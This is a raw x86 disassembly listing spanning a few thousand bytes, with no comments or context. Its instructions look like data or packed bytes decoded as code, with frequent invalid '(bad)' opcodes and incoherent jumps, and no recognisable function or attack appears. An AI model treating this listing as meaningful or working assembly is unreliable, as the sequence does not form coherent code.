  417dcd:	rol    BYTE PTR [esi-0x24],1
  417dd0:	jp     0x417dba
  417dd2:	iret   
  417dd3:	pop    edx
  417dd4:	cs inc ebx
  417dd6:	xchg   BYTE PTR [ebx-0x7eb38d22],al
  417ddc:	fld    TBYTE PTR [ebp-0x1a]
  417ddf:	pop    ecx
  417de0:	push   ds
  417de1:	sub    eax,0xc48783f3
  417de6:	fmul   DWORD PTR [ebx-0x1c294245]
  417dec:	fcomip st,st(3)
  417dee:	pop    ebx
  417def:	jbe    0x417e56
  417df1:	mov    ?,WORD PTR [esi-0x1e]
  417df4:	dec    ecx
  417df5:	push   ebx
  417df6:	(bad)  
  417df7:	sbb    ah,BYTE PTR [eax+ebp*8-0x11]
  417dfb:	add    eax,0x8e31b3a5
  417e00:	scas   eax,DWORD PTR es:[edi]
  417e01:	inc    edx
  417e02:	fisubr WORD PTR [edi]
  417e04:	push   cs
  417e05:	dec    ebx
  417e06:	xchg   esi,eax
  417e07:	mov    esi,0x928a13d3
  417e0c:	shl    BYTE PTR [edx+0x23],0x86
  417e10:	pop    ebx
  417e11:	mov    esp,0xf81e3dbe
  417e16:	jg     0x417e3f
  417e18:	mov    eax,DWORD PTR [edi-0x34]
  417e1b:	loop   0x417de6
  417e1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e1e:	xchg   DWORD PTR [esp+ebp*2-0x55],edi
  417e22:	inc    ecx
  417e23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e24:	pop    ebp
  417e25:	mov    edx,0xefbc12ab
  417e2a:	sub    esp,DWORD PTR [edx]
  417e2c:	fdiv   QWORD PTR [eax+0x2af35a2f]
  417e32:	add    BYTE PTR [eax],dh
  417e34:	(bad)
  417e37:	les    ebx,FWORD PTR ss:[edx]
  417e3a:	mov    ebp,DWORD PTR [eax+0x19]
  417e3d:	pop    es
  417e3e:	add    al,0xfd
  417e40:	sbb    BYTE PTR [ebx+0x76],dh
  417e43:	xor    eax,0x5fe94c29
  417e48:	dec    esi
  417e49:	hlt    
  417e4a:	pop    esp
  417e4b:	pop    edx
  417e4c:	sar    BYTE PTR [ecx],1
  417e4e:	imul   ebx,DWORD PTR [ebp-0x2c],0x83bef5c4
  417e55:	js     0x417ddf
  417e57:	push   eax
  417e58:	cmp    DWORD PTR [eax+0x4c],esi
  417e5b:	xor    ebx,DWORD PTR [ebx-0x768bb165]
  417e61:	mov    cl,0xad
  417e63:	cwde   
  417e64:	sbb    dh,ch
  417e66:	fld    TBYTE PTR [edx+0x33112f6c]
  417e6c:	dec    eax
  417e6d:	sub    esi,esp
  417e6f:	xor    DWORD PTR [edi],0x19
  417e72:	sbb    cl,ch
  417e74:	push   ss
  417e75:	gs or  al,0xb2
  417e78:	mov    eax,ds:0x6cc8f40
  417e7d:	jno    0x417ed6
  417e7f:	test   BYTE PTR [ebx],0x58
  417e82:	imul   ebp,DWORD PTR [ebx-0x6232d0cd],0x240f047c
  417e8c:	test   al,0x83
  417e8e:	dec    ebx
  417e8f:	out    0x63,eax
  417e91:	pop    edi
  417e92:	jno    0x417e69
  417e94:	mov    ecx,0xc3d4b1b5
  417e99:	popa   
  417e9a:	(bad)  
  417e9b:	daa    
  417e9c:	sub    bh,cl
  417e9e:	scas   al,BYTE PTR es:[edi]
  417e9f:	add    ebx,0xfffffffe
  417ea2:	test   al,0xa5
  417ea4:	leave  
  417ea5:	push   cs
  417ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ea7:	cmp    edi,edi
  417ea9:	repz test BYTE PTR [ebx+0x7f8ade43],al
  417eb0:	sbb    bh,BYTE PTR [ebp+0x2e]
  417eb3:	and    dh,BYTE PTR [edx]
  417eb5:	pushf  
  417eb6:	dec    eax
  417eb7:	jmp    0xb317344
  417ebc:	push   esp
  417ebd:	push   esi
  417ebe:	inc    edx
  417ebf:	out    0x1a,al
  417ec1:	test   DWORD PTR [eax-0x3c],ecx
  417ec4:	movntps XMMWORD PTR [ebx-0x53046124],xmm3
  417ecb:	push   ds
  417ecc:	dec    edx
  417ecd:	cwde   
  417ece:	(bad)  
  417ed0:	pop    edx
  417ed1:	fadd   st,st(5)
  417ed3:	arpl   WORD PTR [edi],si
  417ed5:	pop    ss
  417ed6:	les    esp,FWORD PTR [edi+0x0]
  417ed9:	xor    al,0x3c
  417edb:	test   DWORD PTR [ebp-0x14d221bf],edi
  417ee1:	mov    WORD PTR [eax+0x4],?
  417ee4:	mov    edx,0xb8d564e2
  417ee9:	push   edx
  417eea:	daa    
  417eeb:	push   0xa314be6d
  417ef0:	retf   0x26e0
  417ef3:	imul   ebx,DWORD PTR es:[edi+0x5bcae4fb],0xffffff99
  417efb:	mov    WORD PTR ds:0x224a8022,?
  417f01:	jb     0x417eee
  417f03:	cld    
  417f04:	push   ebx
  417f05:	or     BYTE PTR [ebp-0x23],cl
  417f08:	xchg   DWORD PTR [edx-0x13],ebx
  417f0b:	cs inc ebx
  417f0d:	push   eax
  417f0e:	adc    ah,dl
  417f10:	adc    eax,DWORD PTR [ebp-0x604fad8e]
  417f16:	xchg   esi,eax
  417f17:	(bad)  
  417f19:	test   DWORD PTR [ebp-0xb],edi
  417f1c:	fstp   DWORD PTR ds:0xf148f71a
  417f22:	mov    edi,DWORD PTR [esi+0x467b1f9d]
  417f28:	arpl   WORD PTR [edx+0x7d],bx
  417f2b:	stos   BYTE PTR es:[edi],al
  417f2c:	lea    esp,[edi]
  417f2e:	or     ecx,edx
  417f30:	in     eax,0x36
  417f32:	sbb    eax,0x919b84c8
  417f37:	jnp    0x417f05
  417f39:	xor    edi,DWORD PTR [edi]
  417f3b:	add    bl,dl
  417f3d:	jne    0x417f97
  417f3f:	jmp    0x417eec
  417f41:	out    dx,eax
  417f42:	sub    DWORD PTR [ebp+0x69],0xe95c1ca7
  417f49:	mov    edi,0x8a69c406
  417f4e:	push   0x164cc3c1
  417f53:	popf   
  417f54:	jmp    0x417faa
  417f56:	pop    eax
  417f57:	xor    al,0xe
  417f59:	in     al,dx
  417f5a:	jmp    0x75acd1de
  417f5f:	das    
  417f60:	mov    WORD PTR [ebp-0x13],fs
  417f63:	inc    ebp
  417f64:	in     eax,0xba
  417f66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f67:	dec    esp
  417f68:	inc    ebp
  417f69:	pop    eax
  417f6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f6b:	daa    
  417f6c:	and    ch,BYTE PTR [esi-0x5fc68aa2]
  417f72:	mov    bh,0xd6
  417f74:	popa   
  417f75:	jbe    0x417f98
  417f77:	mov    ah,0xb5
  417f79:	xor    al,0x13
  417f7b:	mov    edx,0xdb35190
  417f80:	pusha  
  417f81:	mov    dl,0x20
  417f83:	leave  
  417f84:	add    DWORD PTR [edi-0x45b3c04c],esi
  417f8a:	pop    ecx
  417f8b:	loope  0x417f96
  417f8d:	gs pop esi
  417f8f:	test   DWORD PTR [ebp+0x15],eax
  417f92:	into   
  417f93:	js     0x417f48
  417f95:	dec    esp
  417f96:	bound  ecx,QWORD PTR [eax+ebp*8]
  417f99:	push   0xf2cafe64
  417f9e:	shr    bh,0xc9
  417fa1:	imul   ecx,DWORD PTR [edi+edi*2+0x51],0xfffffff0
  417fa6:	repz mov esp,0xb4989bed
  417fac:	mov    BYTE PTR [eax+0x78c1f864],bl
  417fb2:	iret   
  417fb3:	jo     0x417fdf
  417fb5:	shl    BYTE PTR [edx],0xe3
  417fb8:	bound  ebp,QWORD PTR [esi]
  417fba:	push   edi
  417fbb:	jo     0x417fc0
  417fbd:	jp     0x418005
  417fbf:	bound  ebp,QWORD PTR [ebx-0x30]
  417fc2:	or     edi,DWORD PTR [edi]
  417fc4:	repnz inc esi
  417fc6:	xor    al,0x1
  417fc8:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  417fca:	xor    DWORD PTR [eax-0x68],0xe379df4c
  417fd1:	inc    esp
  417fd2:	sbb    BYTE PTR [esp+esi*1-0x5e],dl
  417fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fd7:	cwde   
  417fd8:	jbe    0x417fb7
  417fda:	sar    esp,1
  417fdc:	inc    edi
  417fdd:	inc    ebx
  417fde:	mov    dl,0xd0
  417fe0:	inc    edi
  417fe1:	sub    eax,0x191b0a0d
  417fe6:	aas    
  417fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fe8:	and    eax,0x138230b1
  417fed:	add    dl,BYTE PTR [ecx+0x4a]
  417ff0:	mov    eax,ds:0xa81c614d
  417ff5:	mov    ebx,0xec2709bb
  417ffa:	push   ecx
  417ffb:	pushf  
  417ffc:	mov    edx,DWORD PTR [ebx]
  417ffe:	int    0xf7
  418000:	in     al,dx
  418001:	add    eax,0xb46a693
  418006:	ret    0x4888
  418009:	ins    DWORD PTR es:[edi],dx
  41800a:	xor    dl,dh
  41800c:	or     eax,0xf2135b8b
  418011:	inc    edx
  418013:	sar    bh,cl
  418015:	inc    ebp
  418016:	scas   al,BYTE PTR es:[edi]
  418017:	clc    
  418018:	in     eax,0x81
  41801a:	rcr    al,0x88
  41801d:	je     0x418040
  41801f:	add    al,ah
  418021:	dec    edi
  418022:	test   al,0x93
  418024:	rep lods eax,DWORD PTR ds:[esi]
  418026:	dec    esi
  418027:	add    BYTE PTR [eax+edi*2+0x73],0xae
  41802c:	jbe    0x417fdf
  41802e:	nop
  41802f:	jle    0x41807b
  418031:	xor    al,0x53
  418033:	push   ecx
  418034:	inc    esi
  418035:	pusha  
  418036:	neg    BYTE PTR [ebp+0x7baa5015]
  41803c:	in     eax,dx
  41803d:	rcr    BYTE PTR [eax-0x18],cl
  418040:	add    BYTE PTR [edx-0x5ed6cf5],ch
  418046:	push   ebx
  418047:	sbb    DWORD PTR [ebp+0x64],esi
  41804a:	addr16 (bad) 
  41804c:	stos   DWORD PTR es:[edi],eax
  41804d:	adc    BYTE PTR [esi-0x7e7b70b6],bl
  418053:	mov    eax,ds:0xf8d56975
  418058:	sbb    esp,ebp
  41805a:	cli    
  41805b:	arpl   WORD PTR [ebp-0x16],bp
  41805e:	sub    DWORD PTR [ecx+0x739e59bd],edx
  418064:	test   al,0x46
  418066:	mov    edi,0x8f157516
  41806b:	ins    BYTE PTR es:[edi],dx
  41806c:	sbb    edi,DWORD PTR [ebp+0x2d9779fc]
  418072:	pop    ebp
  418073:	adc    bh,BYTE PTR [ecx+0x24]
  418076:	test   cl,ah
  418078:	loop   0x418097
  41807a:	jmp    0x60e7c777
  41807f:	adc    esp,edx
  418081:	popf   
  418082:	pop    edi
  418083:	or     eax,0x33a27f57
  418088:	int    0x1d
  41808a:	sbb    al,0x55
  41808c:	lods   al,BYTE PTR ds:[esi]
  41808d:	add    DWORD PTR [ebx],edx
  41808f:	sub    esi,edi
  418091:	push   edi
  418092:	pop    esp
  418093:	xor    DWORD PTR [edx+0x72f6ece0],0xf334fc86
  41809d:	xchg   edi,ebp
  41809f:	shr    BYTE PTR [ebx],cl
  4180a1:	mov    ebx,DWORD PTR [esi+edi*8-0x8]
  4180a5:	lock (bad) 
  4180a7:	das    
  4180a8:	dec    ecx
  4180a9:	stc    
  4180aa:	sti    
  4180ab:	sbb    BYTE PTR [eax],0x30
  4180ae:	push   es
  4180af:	cdq    
  4180b0:	in     eax,dx
  4180b1:	mov    esi,0x7c03148e
  4180b6:	mov    eax,0x392e19e7
  4180bb:	lahf   
  4180bc:	mov    BYTE PTR [edi],bl
  4180be:	and    DWORD PTR [ecx],edi
  4180c0:	mov    cl,0xef
  4180c2:	cmovs  esi,DWORD PTR [ecx+ebp*4-0x157b3ab]
  4180ca:	mov    ah,0x6d
  4180cc:	add    DWORD PTR [esi+0x42],edi
  4180cf:	fst    DWORD PTR [ecx-0x7cdd28d9]
  4180d5:	(bad)  
  4180d6:	push   ecx
  4180d7:	(bad)  
  4180d9:	cmp    eax,0x237ce6d3
  4180de:	mov    ebp,0x1c4bfdc1
  4180e3:	arpl   WORD PTR [edx+0x48],dx
  4180e6:	addr16 push edx
  4180e8:	dec    ebp
  4180e9:	in     eax,dx
  4180ea:	mov    eax,0x883feb39
  4180ef:	(bad)  [ebx-0xd]
  4180f2:	pop    ebx
  4180f3:	mov    edi,0xe43d8844
  4180f8:	mov    edx,0x2ce3a07a
  4180fd:	imul   esi,DWORD PTR [edi+0x5170d954],0x7d012d14
  418107:	pusha  
  418108:	and    eax,0x608f074
  41810d:	xchg   DWORD PTR [eax],esi
  41810f:	out    dx,eax
  418110:	cmp    al,0xb4
  418112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418113:	cmpps  xmm1,XMMWORD PTR [esi+0x26fbb3cb],0x70
  41811b:	xchg   DWORD PTR [edx+0x40a62d40],edx
  418121:	pop    dx
  418123:	jg     0x4180cb
  418125:	(bad)  
  418126:	ret    
  418127:	mov    ah,BYTE PTR [ecx]
  418129:	adc    DWORD PTR [eax+0x3bf56a33],esi
  41812f:	jo     0x4181a5
  418131:	cwde   
  418132:	inc    esi
  418133:	add    dh,BYTE PTR [ebp-0x5c]
  418136:	cmp    al,BYTE PTR [ecx]
  418138:	enter  0x9b3,0x85
  41813c:	fidivr WORD PTR [ecx-0x4f]
  41813f:	add    eax,0x1579baba
  418144:	sti    
  418145:	in     al,dx
  418146:	ds xchg edx,eax
  418148:	aad    0x86
  41814a:	or     esp,DWORD PTR [ecx+edi*2+0x5f069c05]
  418151:	add    BYTE PTR [edx-0x6a1b8f72],ah
  418157:	cwde   
  418158:	stos   DWORD PTR es:[edi],eax
  418159:	xor    DWORD PTR [eax+0x449b1db],esi
  41815f:	or     ah,BYTE PTR [ebx+0x26]
  418162:	or     al,0x1a
  418164:	mov    ss,WORD PTR [edi-0x453e0d8c]
  41816a:	ds sub eax,0xea275c8b
  418170:	cmp    dl,BYTE PTR [ebx-0x590fd0dd]
  418176:	call   0xe446656b
  41817b:	ins    DWORD PTR es:[edi],dx
  41817c:	jmp    0x418165
  41817e:	inc    esi
  41817f:	popa   
  418180:	test   DWORD PTR [ecx+0x554650f2],esp
  418186:	sbb    al,0x3
  418188:	push   edi
  418189:	hlt    
  41818a:	push   esp
  41818b:	lahf   
  41818c:	push   eax
  41818d:	sahf   
  41818e:	sub    eax,0x6e401f72
  418193:	mov    DWORD PTR [ecx+0x6e],esi
  418196:	ds call 0x188a:0x2d5d5583
  41819e:	push   es
  41819f:	arpl   WORD PTR [ebp-0x4df9ce2d],sp
  4181a5:	addr16 cdq 
  4181a7:	inc    DWORD PTR [ecx-0x19]
  4181aa:	pop    ss
  4181ab:	call   FWORD PTR [esi]
  4181ad:	sub    DWORD PTR [esi+0x2d],0x5c2da24a
  4181b4:	call   0xb93f:0xd7d18580
  4181bb:	dec    ecx
  4181bc:	xchg   esi,eax
  4181bd:	lea    edi,[esp+eiz*8]
  4181c0:	mov    ds,WORD PTR [edx-0x34]
  4181c3:	in     eax,0x40
  4181c5:	lds    esi,FWORD PTR [ebp+0x51fa4cd]
  4181cb:	mov    esi,0xa9ca71cd
  4181d0:	mov    ds:0x7a5b6739,al
  4181d5:	cmp    eax,0xb1ebc435
  4181da:	addr16 pop es
  4181dc:	inc    edx
  4181dd:	ror    ch,cl
  4181df:	xlat   BYTE PTR ds:[ebx]
  4181e0:	sbb    DWORD PTR [esi],0x20
  4181e3:	lds    ebx,FWORD PTR [ebx+0x5d]
  4181e6:	fs mov dh,0x24
  4181e9:	sbb    al,0xc1
  4181eb:	out    0x3a,eax
  4181ed:	rol    BYTE PTR [eax+0x2e18d0bd],cl
  4181f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181f4:	retf   0xa165
  4181f7:	cld    
  4181f8:	xor    DWORD PTR [ebp+0xce35b69],ebp
  4181fe:	test   eax,0x309686b9
  418203:	mov    cl,0x68
  418205:	inc    ebx
  418206:	sbb    BYTE PTR [ebx],ch
  418208:	jae    0x418252
  41820a:	fsubp  st(6),st
  41820c:	loop   0x4181c4
  41820e:	cmp    edx,ebp
  418210:	aaa    
  418211:	fdiv   QWORD PTR [ebp-0xd]
  418214:	test   DWORD PTR [ebx+0x6ade23d],ebx
  41821a:	lea    eax,[edi-0x44e495f1]
  418220:	fdivr  DWORD PTR [eax]
  418222:	xor    bh,BYTE PTR [edx]
  418224:	mov    DWORD PTR [edi+0x1c],ecx
  418227:	bound  esp,QWORD PTR [edx-0x7c]
  41822a:	mov    DWORD PTR ds:[ebx],eax
  41822d:	sub    al,BYTE PTR [ebx]
  41822f:	mov    al,0x8e
  418231:	pushf  
  418232:	jl     0x4181c5
  418234:	repz imul ecx,edi,0x39
  418238:	sub    esp,edx
  41823a:	(bad)  
  41823b:	outs   dx,DWORD PTR ds:[esi]
  41823c:	enter  0xa7ee,0x89
  418240:	(bad)  
  418242:	pop    ecx
  418243:	xor    BYTE PTR [eax-0x33],0xec
  418247:	(bad)  
  418248:	jge    0x418270
  41824a:	or     DWORD PTR [eax+0x8],ecx
  41824d:	gs pop edx
  41824f:	test   BYTE PTR [eax],al
  418251:	pop    DWORD PTR [edx]
  418253:	and    eax,0xca98e8e2
  418258:	popf   
  418259:	(bad)
  41825c:	or     BYTE PTR [esi+0x15],ch
  41825f:	push   ecx
  418260:	xchg   esp,eax
  418261:	fild   DWORD PTR [ebx]
  418263:	lea    ebp,ds:0x34cd7602
  418269:	(bad)
  41826c:	xchg   esp,eax
  41826d:	rcr    DWORD PTR [edi],cl
  41826f:	inc    edx
  418270:	outs   dx,DWORD PTR ds:[esi]
  418271:	(bad)  
  418272:	int    0x8b
  418274:	gs pusha 
  418276:	call   0xce3a:0x64966d99
  41827d:	jns    0x41824a
  41827f:	test   dl,0x35
  418282:	jnp    0x4182e8
  418284:	lods   eax,DWORD PTR ds:[esi]
  418285:	mov    ecx,0xfe4e7fe
  41828a:	mov    esi,ds
  41828c:	ror    BYTE PTR [ebp-0x59],1
  41828f:	jp     0x41830c
  418291:	and    ebx,DWORD PTR [edx-0x6c]
  418294:	inc    eax
  418295:	push   ecx
  418296:	mov    ah,ch
  418298:	bound  ecx,QWORD PTR [ecx+0x59]
  41829b:	test   dh,0xc7
  41829e:	in     al,0xce
  4182a0:	loop   0x4182f4
  4182a2:	mov    al,0x89
  4182a4:	gs mov cs,ebp
  4182a7:	pusha  
  4182a8:	shl    DWORD PTR [edx-0x19],1
  4182ab:	push   es
  4182ac:	dec    edx
  4182ad:	cs cmp al,0xd0
  4182b0:	pop    ebx
  4182b1:	mov    dh,0xf
  4182b3:	pop    edi
  4182b4:	xor    eax,0xc22164f1
  4182b9:	scas   al,BYTE PTR es:[edi]
  4182ba:	cli    
  4182bb:	mov    ecx,0x8f10d0a2
  4182c0:	sbb    edi,DWORD PTR [eax+0x1a]
  4182c3:	cld    
  4182c4:	fbstp  TBYTE PTR [eax]
  4182c6:	out    0xf6,eax
  4182c8:	int    0x66
  4182ca:	(bad)  
  4182cb:	or     DWORD PTR [esi-0x25efc5d7],edx
  4182d1:	sub    DWORD PTR [esi],eax
  4182d3:	xor    edx,0x52
  4182d6:	sub    eax,0x49a629e
  4182db:	xor    eax,0x443bc661
  4182e0:	mov    ebx,0x60988998
  4182e5:	push   ss
  4182e6:	adc    ebx,0x4b59710f
  4182ec:	ret    
  4182ed:	icebp  
  4182ee:	add    al,0x71
  4182f0:	mov    DWORD PTR [edi-0x60e4f11f],edi
  4182f6:	call   0x3ce50be7
  4182fb:	(bad)  
  4182fc:	in     eax,0x7c
  4182fe:	and    eax,0x8297e0ee
  418303:	pop    ebp
  418304:	sub    BYTE PTR [edx+0x30],ch
  418307:	and    al,0x42
  418309:	mov    ch,0x56
  41830b:	push   ss
  41830c:	outs   dx,BYTE PTR ds:[esi]
  41830d:	and    edx,DWORD PTR [esi-0x54]
  418310:	std    
  418311:	(bad)  
  418312:	pusha  
  418313:	sub    cl,dl
  418315:	lods   al,BYTE PTR ds:[esi]
  418316:	adc    eax,0x7a2d88cb
  41831b:	sbb    al,0xfe
  41831d:	sbb    ch,BYTE PTR [ebx+0x72c932e4]
  418323:	lods   al,BYTE PTR ds:[esi]
  418324:	repnz and eax,0xd5c1e132
  41832a:	push   ds
  41832b:	xor    cl,BYTE PTR [ecx-0x37]
  41832e:	cmp    DWORD PTR [esi],eax
  418330:	or     eax,0x6e690411
  418335:	inc    edi
  418336:	jmp    DWORD PTR [ebx-0x290eed96]
  41833c:	xchg   ebp,eax
  41833d:	sbb    BYTE PTR [edi-0x48086810],dh
  418343:	scas   al,BYTE PTR es:[edi]
  418344:	pop    ecx
  418345:	mov    al,0x53
  418347:	add    al,0xe4
  418349:	cmp    bh,BYTE PTR [ebx]
  41834b:	jno    0x4182d5
  41834d:	in     eax,dx
  41834e:	(bad)  
  418350:	xchg   esp,eax
  418351:	xchg   esi,eax
  418352:	jp     0x41838c
  418354:	push   ebp
  418355:	inc    ebx
  418356:	jae    0x41831f
  418358:	scas   eax,DWORD PTR es:[edi]
  418359:	cmp    al,0x65
  41835b:	push   ss
  41835c:	jne    0x4182f6
  41835e:	jp     0x418312
  418360:	sbb    DWORD PTR [ecx-0x7d],ebx
  418363:	lgdtd  [esi-0x60efc643]
  41836a:	(bad)  
  41836b:	jle    0x4183d5
  41836d:	mov    esp,0xdf2eb339
  418372:	popa   
  418373:	dec    esp
  418374:	aad    0x1e
  418376:	mov    ds:0xb9732c03,al
  41837b:	inc    ebx
  41837c:	inc    edi
  41837d:	jg     0x418336
  41837f:	add    BYTE PTR [esi+0x6c],al
  418382:	cwde   
  418383:	arpl   WORD PTR ds:0xef6c1c97,si
  418389:	push   esp
  41838a:	jno    0x41830f
  41838c:	adc    edi,DWORD PTR ds:0x2ed107a5
  418392:	std    
  418393:	cli    
  418394:	mov    eax,0x4b9b7324
  418399:	xchg   edi,eax
  41839a:	dec    edx
  41839b:	mov    ah,0xe0
  41839d:	stos   BYTE PTR es:[edi],al
  41839e:	mov    ds:0x13042315,al
  4183a3:	inc    ebp
  4183a4:	mov    dh,0x84
  4183a6:	daa    
  4183a7:	mov    edi,0x5da8b758
  4183ac:	shl    BYTE PTR [esi+ecx*8+0x15407532],0x0
  4183b4:	adc    al,0xe8
  4183b6:	sahf   
  4183b7:	(bad)  
  4183b8:	mov    esp,DWORD PTR [esi-0x27]
  4183bb:	clc    
  4183bc:	ret    
  4183bd:	push   ebp
  4183be:	pop    ebx
  4183bf:	arpl   WORD PTR [esi],ax
  4183c1:	loope  0x418391
  4183c3:	das    
  4183c4:	test   DWORD PTR [edx+0x5f2bd595],edi
  4183ca:	test   eax,0x44442a73
  4183cf:	sti    
  4183d0:	add    BYTE PTR [eax+0x6239705f],ah
  4183d6:	pop    ecx
  4183d7:	pop    esi
  4183d8:	test   esp,ebx
  4183da:	xchg   esp,eax
  4183db:	mov    esi,0x5bba9e7f
  4183e0:	add    BYTE PTR ds:0xbd3381dd,dh
  4183e6:	shl    bh,cl
  4183e8:	xchg   edx,eax
  4183e9:	mov    eax,ds:0x22020fe
  4183ee:	cdq    
  4183ef:	dec    ebx
  4183f0:	xchg   edi,eax
  4183f1:	xor    dh,ah
  4183f3:	mov    eax,ds:0xa9751969
  4183f8:	sbb    eax,0xffffffdd
  4183fb:	hlt    
  4183fc:	in     eax,0xef
  4183fe:	add    DWORD PTR [ecx+0x6ec2adb1],ecx
  418404:	sub    cl,dl
  418406:	add    eax,0x739f03f0
  41840b:	(bad)  
  41840c:	mov    eax,ds:0xa4e89e45
  418411:	mov    eax,0x2246b44
  418416:	outs   dx,DWORD PTR ds:[esi]
  418417:	mov    al,ds:0x4d6d07d9
  41841c:	and    ch,BYTE PTR [esi]
  41841e:	test   al,0xe
  418420:	push   cs
  418421:	xchg   esp,eax
  418422:	lea    eax,[ebx-0x7d]
  418425:	pop    ecx
  418426:	mov    edi,0xec7e16f0
  41842b:	cmp    DWORD PTR [esi-0x5ac84353],esp
  418431:	int3   
  418432:	(bad)  
  418434:	jne    0x418427
  418436:	xchg   ebx,eax
  418437:	jae    0x418433
  418439:	hlt    
  41843a:	test   eax,0xc68e801b
  41843f:	push   ebx
  418440:	outs   dx,BYTE PTR ds:[esi]
  418441:	jnp    0x4184ab
  418443:	xor    ebp,DWORD PTR [ebp+0x494228c5]
  418449:	jo     0x41844a
  41844b:	in     al,dx
  41844c:	inc    ebp
  41844d:	cmc    
  41844e:	rol    al,1
  418450:	jne    0x418464
  418452:	pushf  
  418453:	push   ss
  418454:	or     ah,BYTE PTR [esi]
  418456:	retf   0x2e06
  418459:	rcr    bl,cl
  41845b:	(bad)  
  41845c:	xchg   ecx,eax
  41845d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41845e:	jmp    0x41840f
  418460:	push   edx
  418461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418462:	fwait
  418463:	rol    BYTE PTR [edi],0x8d
  418466:	popf   
  418467:	test   DWORD PTR [eax+0x2cb5afc4],0x6d9aa0c6
  418471:	inc    esi
  418472:	pop    ecx
  418473:	push   ds
  418474:	lahf   
  418475:	(bad)  
  418476:	in     eax,0x62
  418478:	inc    eax
  418479:	aaa    
  41847a:	mov    bl,0xf
  41847c:	cli    
  41847d:	jp     0x418493
  41847f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418480:	mov    al,0x8d
  418482:	pop    ebp
  418483:	or     edi,0xdf65f336
  418489:	in     eax,dx
  41848a:	(bad)  
  41848b:	mov    DWORD PTR [eax],0xfcc925e3
  418491:	pop    ds
  418492:	xchg   esi,eax
  418493:	mov    bl,BYTE PTR [esi]
  418495:	and    BYTE PTR [edx-0x8],cl
  418498:	cld    
  418499:	retf   0x5aa4
  41849c:	jno    0x4184d9
  41849e:	std    
  41849f:	fsubp  st(6),st
  4184a1:	fisub  DWORD PTR [edx-0x866a740]
  4184a7:	or     edi,DWORD PTR [edi]
  4184a9:	pop    edx
  4184aa:	sbb    ah,BYTE PTR [edi+0x47535e61]
  4184b0:	dec    ecx
  4184b1:	mov    al,0xf5
  4184b3:	dec    ebp
  4184b4:	inc    eax
  4184b5:	ror    DWORD PTR [ecx+0xff4de22],0xda
  4184bc:	push   edx
  4184bd:	push   esi
  4184be:	ja     0x4184ff
  4184c0:	daa    
  4184c1:	mov    al,ds:0x5aba9f64
  4184c6:	pusha  
  4184c7:	pushf  
  4184c8:	fdiv   QWORD PTR [edx]
  4184ca:	add    al,0x6d
  4184cc:	popa   
  4184cd:	imul   esp,ebp,0xba92620
  4184d3:	rcr    DWORD PTR [edi-0x61766a59],cl
  4184d9:	ss pop ebx
  4184db:	ds xchg ebx,eax
  4184dd:	adc    al,0xd6
  4184df:	cmp    eax,0x93f13089
  4184e4:	daa    
  4184e5:	mov    esp,0xc7048872
  4184ea:	sub    DWORD PTR [ebx],ebx
  4184ec:	or     al,0x32
  4184ee:	(bad)  
  4184f0:	fidiv  DWORD PTR [eax+0xc0281c8]
  4184f6:	(bad)  
  4184f7:	xor    cl,bl
  4184f9:	enter  0x6a27,0xa8
  4184fd:	in     eax,dx
  4184fe:	push   ss
  4184ff:	cmp    ecx,DWORD PTR [edi+0x55]
  418502:	retf   
  418503:	test   BYTE PTR [edx-0x74],al
  418506:	lods   al,BYTE PTR ds:[esi]
  418507:	mov    al,ds:0x147f0fa
  41850c:	sub    esi,esp
  41850e:	lods   eax,DWORD PTR ds:[esi]
  41850f:	add    bl,BYTE PTR [edx+0x64]
  418512:	inc    ecx
  418513:	ret    
  418514:	fimul  DWORD PTR [esi-0xb]
  418517:	xchg   ecx,eax
  418518:	xchg   ebx,eax
  418519:	add    ebx,DWORD PTR [ebx+0x61]
  41851c:	sbb    BYTE PTR [edi+0x7fa1de54],dl
  418522:	ds mov esi,edi
  418525:	jae    0x418502
  418527:	es and eax,0x9884f560
  41852d:	pop    ebx
  41852e:	(bad)  
  41852f:	lock sub eax,0xac1dbc9c
  418535:	and    eax,0x7448936
  41853a:	cmc    
  41853b:	mov    ebp,0xbecd2fe6
  418540:	cld    
  418541:	dec    esi
  418542:	call   0x4a81818e
  418547:	and    eax,0xec854c83
  41854c:	retf   
  41854d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41854e:	mov    esp,0x445719
  418553:	fisubr DWORD PTR [ebx]
  418555:	push   0xffffff82
  418557:	test   eax,0x41ca1e99
  41855c:	imul   esp,DWORD PTR [edi+0x6e19b2f0],0x42
  418563:	xor    DWORD PTR [edi-0x68],0xffffffdd
  418567:	adc    BYTE PTR [ebx],bh
  418569:	(bad)  
  41856a:	sti    
  41856b:	outs   dx,BYTE PTR ds:[esi]
  41856c:	sub    BYTE PTR [ecx],bh
  41856e:	popw   ss
  418570:	jmp    0x418595
  418572:	sbb    al,BYTE PTR [eax+0x13]
  418575:	pop    esp
  418576:	dec    eax
  418577:	movzx  edi,di
  41857a:	ret    
  41857b:	scas   eax,DWORD PTR es:[edi]
  41857c:	add    dh,BYTE PTR [ebp+0x2b]
  41857f:	xor    DWORD PTR [esi+0x48],edi
  418582:	dec    esi
  418583:	loopne 0x418546
  418585:	jne    0x418589
  418587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418588:	cmc    
  418589:	fbstp  TBYTE PTR [eax+0x4e]
  41858c:	int3   
  41858d:	(bad)  
  41858e:	jecxz  0x4185dc
  418590:	aam    0xcf
  418592:	add    eax,0x612b6ccc
  418597:	mov    ah,0x7
  418599:	aas    
  41859a:	shr    dh,1
  41859c:	cmc    
  41859d:	int3   
  41859e:	aad    0xe2
  4185a0:	jb     0x41856f
  4185a2:	data16 cmp al,0xfe
  4185a5:	lods   eax,DWORD PTR ds:[esi]
  4185a6:	jl     0x41852d
  4185a8:	loope  0x41859b
  4185aa:	jle    0x41861c
